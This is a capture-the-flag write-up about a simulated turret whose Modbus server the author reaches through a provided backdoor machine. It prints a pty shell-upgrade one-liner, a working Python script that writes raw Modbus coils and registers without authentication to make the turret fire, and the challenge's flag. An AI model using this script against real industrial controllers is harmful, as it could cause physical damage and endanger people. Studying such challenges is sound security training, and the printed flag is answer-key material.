In the files given there are 3 subfolders:
- monitoring -> which is a backdoor to a machine in the same network as the other two machines.
- tncs -> which runs different servers like the radar display server (port 6000), a radar data server (port 6001) and also a modbus server.
- turret -> which creates a client that connects to the modbus server, here also the flag appears which is showed if certein conditions are met.

The turret  is reactive, meaning that I have to connect on port 502 and interact with the modbus server to influence the turret behaviour. The port 502 is only accesible from devices within the same network, so the connection should originate from the backdoored machine. To get an interactive shell I used:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then I `Ctrl +z` to background the process and get back to host and finally I executed:

```bash
stty raw -echo; fg
```

On the machine the `pymodbus` is not installed, nor can it be installed. As a result I had to craft raw modbus packets. To get the flag the turrent must fire the first shot with ammo type `AOCAA`. But before that, I had to pass other checks like setting the lock (coil 1) to false, the safety (coil 2) to true, the spool (coil 3) to true , and finally, the fire command (coil 4) must be set to true. After configuring the coils, I needed to send a register containing the signature value (a transport ID starting with 27...), which can be obtained by connecting to the radar display server  (port 6000). Once the signature is set, a second register must be sent with the desired ammo type. After running the following script:

```python
import socket
import struct
import time

HOST = "tncs-tcp-502"
PORT = 502

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

def write_single_coil(transaction_id,unit_id, coil_address, value):
    protocol_id = 0
    length = 6
    function_code = 0x05  # Write single coil
    mbap_header = struct.pack(">HHHB", transaction_id, protocol_id, 6, unit_id)
    pdu = struct.pack(">BHH", function_code, coil_address, 0xFF00 if value else 0x0000)
    return mbap_header + pdu

def write_single_register(transaction_id, unit_id, register_address, value):
    protocol_id = 0
    length = 6
    function_code = 0x06  # Write single register
    mbap_header = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    pdu = struct.pack(">BHH", function_code, register_address, value)
    return mbap_header + pdu


# Write to coil 1 (False)
request = write_single_coil(1,unit_id=1, coil_address=0x0001, value=False)
sock.send(request)
response = sock.recv(1024)
print(f"Coil 1 ON response: {response.hex()}")


# Write to coil 2 (True)
request = write_single_coil(2,unit_id=1, coil_address=0x0002, value=True)
sock.send(request)
response = sock.recv(1024)
print(f"Coil 2 OFF response: {response.hex()}")
time.sleep(1)

# Write to coil 3 (True)
request = write_single_coil(3,unit_id=1, coil_address=0x0003, value=True)
sock.send(request)
response = sock.recv(1024)
print(f"Coil 3 ON response: {response.hex()}")

# Write to coil 4 (True)
request = write_single_coil(4,unit_id=1, coil_address=0x0004, value=True)
sock.send(request)
response = sock.recv(1024)
print(f"Coil 4 ON response: {response.hex()}")

# Write value (signature) to register 0x0001
request = write_single_register(5, unit_id=1, register_address=0x0001, value=<signature>)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send(request)
response = sock.recv(1024)
print(f"Register 1 write response: {response.hex()}")

# Write value (ammo type) to register 0x0002
request = write_single_register(6, unit_id=1, register_address=0x0002, value=<ammo_type>) #1= AOCAA    2=HE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send(request)
response = sock.recv(1024)
print(f"Register 2 write response: {response.hex()}")

sock.close()
```

I waited for the signature to change (it changes after a hit) and also for `prev_fire` to be set to false. Then I manually changed the signature value and set the ammo type to `HE` in my script and reran it to get the flag, which could be seen on the radar display server.

`dach2025{I_kn0w_I'd_n3v3r_be_me_w1th0ut_the_CYYYBEER_s3cur1ty_q7fhuunt345u4wfw}`
